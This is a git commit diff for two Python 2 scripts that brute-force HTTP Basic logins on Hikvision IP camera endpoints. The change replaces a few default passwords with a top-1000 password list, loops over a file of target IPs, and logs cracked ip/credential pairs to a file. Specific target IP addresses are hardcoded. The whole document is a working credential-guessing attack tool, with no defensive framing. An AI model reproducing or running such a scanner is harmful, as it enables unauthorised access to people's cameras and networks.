3f097b6472adceb951fafffe62bcd48ed267f571
narata <Narata@IP-58-154-189-43.neu.edu.cn>
2016-05-26 14:54:51 +0800

    2
    2

--- req.py
+++ req.py
@@ -2,27 +2,39 @@ import base64
 import requests
 from threading import *
 
-users = ('admin:123456','admin:12345','admin:abc12345','admin:admin123')
 urls = ( '/PSIA/Custom/SelfExt/userCheck', '/ISAPI/Security/userCheck', '/PSIA/Custom/HIK/userCheck')
 
 fp = open('1.txt','r')
 fp1 = open('ip.txt','w')
 
+def getusers():
+    users = []
+    fp2 = open('password-top1000.txt', 'r')
+    ip = fp2.readlines()
+    for user in ip:
+        users.append('admin:' + user.strip('\n'))
+    fp2.close()
+    return users
+
 def scan(ip):
-    print ip
+    #print ip
     ip = ip.strip('\n')
     site = "http://" + ip
     for url in urls:
         site = site + url
+        users = getusers()
         for user in users:
             user_pass = 'Basic ' + base64.b64encode(user)
             headers = {'Authorization': user_pass}
             try:
-                r = requests.get(site, headers=headers)
+                r = requests.get(site, headers=headers, timeout=5)
                 if '200' in str(r):
-                    print site, user, r.text
                     if '200' in r.text:
                         fp1.write(ip + ' ' + user + '\n')
+                        print ip, user
+                        break
+                else:
+                    break
             except:
                 return 0
 
@@ -41,5 +53,4 @@ def main():
             return 1
 
 if __name__ == '__main__':
-    ip = '202.199.233.29'
-    scan(ip)
+    main()
--- test.py
+++ test.py
@@ -2,22 +2,35 @@ import base64
 import requests
 from threading import *
 
-user = 'admin:12345'
-url =  '/PSIA/Custom/SelfExt/userCheck'
+url =  '/PSIA/Custom/HIK/userCheck'
+
+def getusers():
+    users = []
+    fp = open('password-top1000.txt', 'r')
+    ip = fp.readlines()
+    for user in ip:
+        users.append('admin:' + user.strip('\n'))
+    return users
 
 def scan(ip):
-    print ip
+    users = getusers()
     ip = ip.strip('\n')
     site = "http://" + ip
     site = site + url
-    user_pass = 'Basic ' + base64.b64encode(user)
-    headers = {'Authorization': user_pass}
-    try:
-        r = requests.get(site, headers=headers)
-        print r, site, user, r.text
-    except:
-        return 0
+    i = 0
+    for user in users:
+        user_pass = 'Basic ' + base64.b64encode(user)
+        headers = {'Authorization': user_pass}
+        try:
+            r = requests.get(site, headers=headers)
+            print i, r
+            i = i + 1
+            if '200' in r.text:
+                print user, r.text
+        except:
+            return 0
 
 if __name__ == '__main__':
-    ip = '202.199.233.29'
+    ip = '112.91.211.155'
     scan(ip)
+    #print getusers()
